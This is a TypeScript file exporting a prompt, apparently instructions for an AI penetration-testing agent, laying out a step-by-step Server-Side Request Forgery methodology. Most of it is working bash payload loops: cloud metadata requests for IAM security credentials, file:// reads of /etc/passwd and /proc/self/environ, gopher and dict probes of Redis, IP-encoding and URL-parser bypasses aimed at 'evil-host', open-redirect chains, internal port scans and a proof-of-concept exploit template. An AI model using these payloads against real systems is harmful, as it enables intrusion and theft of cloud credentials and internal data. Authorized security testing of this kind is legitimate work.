/**
 * Server-Side Request Forgery (SSRF) testing methodology
 */

export const SSRF_TESTING_PROMPT = `
# Server-Side Request Forgery (SSRF) Testing Methodology

You are testing for Server-Side Request Forgery (SSRF) vulnerabilities. SSRF allows attackers to make the server perform requests to unintended locations, potentially accessing internal services, cloud metadata, or local files.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., accessing internal services, reading cloud metadata, extracting sensitive data).

## Core Principles

1. **POC is a codification of your exploit process** - Document exactly what you did to exploit the vulnerability
2. **Authenticate first** - If the endpoint requires auth, handle authentication before testing
3. **Work toward the objective** - Keep the session goal in mind throughout testing
4. **Demonstrate actual impact** - Show what internal resources were accessed, not just that a request was made

## Understanding SSRF Types

- **Basic SSRF**: Response from the fetched URL is returned to the attacker
- **Blind SSRF**: Server makes the request but response is not returned (detect via out-of-band callbacks)
- **Partial SSRF**: Only part of the URL is controllable (e.g., path but not host)

## Testing Approach

### Step 1: Authentication (if required)

Before testing, ensure you have a valid session:

\`\`\`bash
# Authenticate and save session
curl -s -c cookies.txt -X POST "\$TARGET/login" \\
  -d "username=\$USER&password=\$PASS"

# Use session for subsequent requests
AUTH_HEADER="Cookie: \$(cat cookies.txt | grep -v '^#' | awk '{print \$6\"=\"\$7}')"
\`\`\`

### Step 2: Identify SSRF Parameters

Look for parameters that accept URLs or URL-like input:
- \`url=\`, \`uri=\`, \`link=\`, \`href=\`, \`src=\`, \`source=\`
- \`redirect=\`, \`redirect_url=\`, \`return=\`, \`next=\`, \`dest=\`
- \`fetch=\`, \`load=\`, \`read=\`, \`get=\`, \`request=\`
- \`callback=\`, \`callback_url=\`, \`webhook=\`, \`ping=\`
- \`file=\`, \`path=\`, \`document=\` (may also work for SSRF)
- \`img=\`, \`image=\`, \`avatar=\`, \`photo=\`

### Step 3: Test Internal Network Access

#### Localhost Access
\`\`\`bash
localhost_payloads=(
  "http://127.0.0.1"
  "http://localhost"
  "http://127.0.0.1:80"
  "http://127.0.0.1:8080"
  "http://127.0.0.1:443"
  "http://[::1]"
  "http://0.0.0.0"
)
for payload in "\${localhost_payloads[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$payload")
  echo "Testing \$payload:"
  echo "\$response" | head -20
done
\`\`\`

#### Internal Network Ranges
\`\`\`bash
internal_payloads=(
  "http://192.168.0.1"
  "http://192.168.1.1"
  "http://10.0.0.1"
  "http://172.16.0.1"
  "http://172.17.0.1"   # Docker default
  "http://172.18.0.1"
)
for payload in "\${internal_payloads[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$payload")
  if [ -n "\$response" ] && ! echo "\$response" | grep -qi "error\\|invalid\\|blocked"; then
    echo "[+] Internal access possible: \$payload"
  fi
done
\`\`\`

#### Internal Service Discovery
\`\`\`bash
# If you found hints about internal service names in the application
internal_services=(
  "http://internal-service"
  "http://backend"
  "http://api-internal"
  "http://admin"
  "http://db"
  "http://redis"
  "http://elasticsearch"
)
for service in "\${internal_services[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$service")
  if [ -n "\$response" ]; then
    echo "[+] Internal service accessible: \$service"
    echo "\$response" | head -20
  fi
done
\`\`\`

### Step 4: Test Cloud Metadata Endpoints

Cloud metadata services are HIGH-VALUE targets for SSRF:

\`\`\`bash
# AWS EC2 Metadata
aws_metadata=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/user-data"
  "http://169.254.169.254/latest/dynamic/instance-identity/document"
)

# GCP Metadata (requires header, but try anyway)
gcp_metadata=(
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://169.254.169.254/computeMetadata/v1/"
)

# Azure Metadata
azure_metadata=(
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)

# Test all cloud endpoints
for endpoint in "\${aws_metadata[@]}" "\${gcp_metadata[@]}" "\${azure_metadata[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$endpoint")
  if echo "\$response" | grep -qiE "ami-|instance|private|security-credentials|access.*key"; then
    echo "[+] CRITICAL: Cloud metadata accessible via: \$endpoint"
    echo "\$response"
  fi
done
\`\`\`

### Step 5: Test Protocol Handlers

SSRF may allow access to different protocol handlers:

\`\`\`bash
# File protocol (read local files)
file_payloads=(
  "file:///etc/passwd"
  "file:///etc/hosts"
  "file:///proc/self/environ"
  "file:///var/www/html/index.php"
  "file://localhost/etc/passwd"
)
for payload in "\${file_payloads[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$(echo -n "\$payload" | jq -sRr @uri)")
  if echo "\$response" | grep -qE "root:x:|root:.*:0:0"; then
    echo "[+] File protocol SSRF confirmed: \$payload"
  fi
done

# Gopher protocol (more advanced attacks)
# gopher://127.0.0.1:6379/_*1%0d%0a\$4%0d%0aINFO%0d%0a  # Redis

# Dict protocol
dict_payload="dict://127.0.0.1:6379/INFO"
response=\$(curl -s "\$TARGET?url=\$dict_payload")
if echo "\$response" | grep -qi "redis"; then
  echo "[+] Dict protocol works - Redis accessible"
fi
\`\`\`

### Step 6: Bypassing Blacklist-Based Defenses (PortSwigger Best Practice)

**IP Address Encoding Variations:**
\`\`\`bash
# Different representations of 127.0.0.1
ip_bypasses=(
  "http://2130706433"           # Decimal
  "http://0x7f000001"           # Hex
  "http://0x7f.0x0.0x0.0x1"     # Hex with dots
  "http://017700000001"         # Octal (full)
  "http://0177.0.0.1"           # Octal (partial)
  "http://127.1"                # Shortened
  "http://127.0.1"              # Shortened alternative
  "http://0"                    # Zero (often resolves to localhost)
  "http://0.0.0.0"              # All interfaces
  "http://[::1]"                # IPv6 localhost
  "http://[0:0:0:0:0:0:0:1]"    # IPv6 full
)
for bypass in "\${ip_bypasses[@]}"; do
  response=\$(curl -s "\$TARGET?url=\$bypass")
  if [ -n "\$response" ]; then
    echo "[+] IP bypass worked: \$bypass"
  fi
done
\`\`\`

**URL Encoding Bypass:**
\`\`\`bash
encoded_payloads=(
  "http://%31%32%37%2e%30%2e%30%2e%31"       # URL encoded 127.0.0.1
  "http://%32%31%33%30%37%30%36%34%33%33"    # URL encoded decimal
  "http://127.0.0.1%00.evil.com"              # Null byte termination
)
\`\`\`

**Custom Domain Resolution:**
\`\`\`bash
# Register domain that resolves to internal IP
# Or use services like nip.io, xip.io
dns_payloads=(
  "http://127.0.0.1.nip.io"
  "http://localtest.me"         # Resolves to 127.0.0.1
  "http://vcap.me"              # Resolves to 127.0.0.1
  "http://your-domain-pointing-to-127.0.0.1"
)
\`\`\`

### Step 7: Bypassing Whitelist-Based Defenses (PortSwigger Best Practice)

**Credential Injection:**
\`\`\`bash
# Embed target in URL credentials
curl -s "\$TARGET?url=https://expected-host:fakepassword@evil-host"
curl -s "\$TARGET?url=https://expected-host@evil-host"
curl -s "\$TARGET?url=https://evil-host%23@expected-host"  # # encoded
\`\`\`

**Fragment Abuse:**
\`\`\`bash
# Use fragment to confuse parser
curl -s "\$TARGET?url=https://evil-host#expected-host"
curl -s "\$TARGET?url=https://evil-host%23expected-host"  # # encoded
\`\`\`

**DNS Hierarchy Exploitation:**
\`\`\`bash
# Create subdomain of allowed host
curl -s "\$TARGET?url=https://expected-host.evil-host"
curl -s "\$TARGET?url=https://expected-hostevil.com"
\`\`\`

**URL Parser Discrepancies:**
\`\`\`bash
# Different parsers interpret URLs differently
curl -s "\$TARGET?url=https://expected-host%2f%2f@evil-host"
curl -s "\$TARGET?url=https://expected-host%5c%5c@evil-host"  # backslashes
curl -s "\$TARGET?url=https://expected-host%252f@evil-host"   # double encoded
\`\`\`

### Step 8: Open Redirection Chain Bypass

**Exploit open redirect in allowed domain to reach internal targets:**

\`\`\`bash
# If allowed-domain.com has an open redirect:
# allowed-domain.com/redirect?url=http://internal-target

# Chain it through SSRF
curl -s "\$TARGET?url=https://allowed-domain.com/redirect?url=http://169.254.169.254/latest/meta-data/"

# Common redirect parameters to look for
redirect_params=("url" "redirect" "next" "dest" "return" "returnUrl" "redirect_uri" "continue" "target")
\`\`\`

### Step 9: Port Scanning via SSRF

If SSRF is confirmed, use it to scan internal ports:

\`\`\`bash
# Scan common internal ports
common_ports=(22 80 443 3306 5432 6379 8080 9200 27017)
for port in "\${common_ports[@]}"; do
  response=\$(curl -s --max-time 3 "\$TARGET?url=http://127.0.0.1:\$port")
  if [ -n "\$response" ]; then
    echo "[+] Port \$port appears open"
  fi
done
\`\`\`

### Step 8: Document Working Exploit

Once you confirm SSRF, create a POC:

\`\`\`bash
#!/bin/bash
# POC: Server-Side Request Forgery in [Endpoint]
# Objective: [Session goal - access internal service, read metadata, etc.]
# CWE-918: Server-Side Request Forgery (SSRF)

TARGET="[TARGET_URL]"

# STEP 1: AUTHENTICATION (if needed)
SESSION="[SESSION_COOKIE]"
AUTH_HEADER="Cookie: \${SESSION}"

# STEP 2: EXPLOITATION
# The SSRF payload that worked:
echo "[*] Exploiting SSRF vulnerability..."

# Example: Accessing internal service
SSRF_PAYLOAD="http://internal-service"
response=\$(curl -s -H "\$AUTH_HEADER" \\
  "\$TARGET?url=\$SSRF_PAYLOAD")

# STEP 3: VALIDATE SUCCESS
echo "[+] Response from internal service:"
echo "\$response"

# Check for sensitive data
if echo "\$response" | grep -qiE "flag|secret|password|key|token|credential"; then
  echo "[+] SSRF CONFIRMED - Sensitive data retrieved from internal service"
  exit 0
fi

# Check for cloud metadata
if echo "\$response" | grep -qiE "ami-|instance-id|security-credentials"; then
  echo "[+] SSRF CONFIRMED - Cloud metadata accessible"
  exit 0
fi

echo "[+] SSRF CONFIRMED - Internal resource accessed"
exit 0
\`\`\`

## Content Validation

**Validate that you actually accessed the internal resource:**

| Target | What to Validate |
|--------|------------------|
| Internal service | Service-specific content (not error page) |
| Cloud metadata | AWS ami-, GCP project, Azure instance info |
| Local files (file://) | File contents (e.g., root:x:0:0 for /etc/passwd) |
| Redis/DB | Service banner or data |

## Common SSRF Indicators

Signs that SSRF worked:
- Response contains internal service content
- Response differs from normal "invalid URL" error
- Response contains private IP information
- Response shows cloud instance metadata
- Timing differences (internal vs external requests)

## Evidence Validation Checkpoint

**BEFORE documenting findings, verify you have AT LEAST ONE of:**
- Internal service response content retrieved
- Cloud metadata accessed (AWS/GCP/Azure instance data, credentials)
- DNS callback to controlled server (with unique identifier)
- Port scan results showing internal connectivity
- Blacklist/whitelist bypass technique confirmed (IP encoding, URL parsing)
- Open redirection chain exploited for internal access

**NOT EVIDENCE (do not report these alone):**
- Request made but no response analysis
- Different error message (might just be blocking)
- Timeout without confirmation
- HTTP 200 without internal data
- External URL fetch working (that's not SSRF unless you access internal resources)

## Success Criteria

A valid SSRF finding must demonstrate:

1. **Authentication handled** - Session established if required
2. **Internal access confirmed** - Server made request to internal resource
3. **Impact demonstrated** - Show what was accessed (metadata, internal service, files)
4. **Objective progress** - Sensitive data extracted or internal access achieved

## Remember

- **Test bypass techniques first** - IP encoding, URL parsing tricks, open redirects
- **Cloud metadata is high-value** - 169.254.169.254 is your primary target
- **Try multiple protocols** - file://, gopher://, dict:// may work when http:// is filtered
- **POC = codification of your exploit** - document what you actually did
- **Authenticate first** when testing authenticated endpoints
- **Document the CWE** - CWE-918 for SSRF
- **Show actual impact** - accessing localhost is not enough; show what data was retrieved
`;
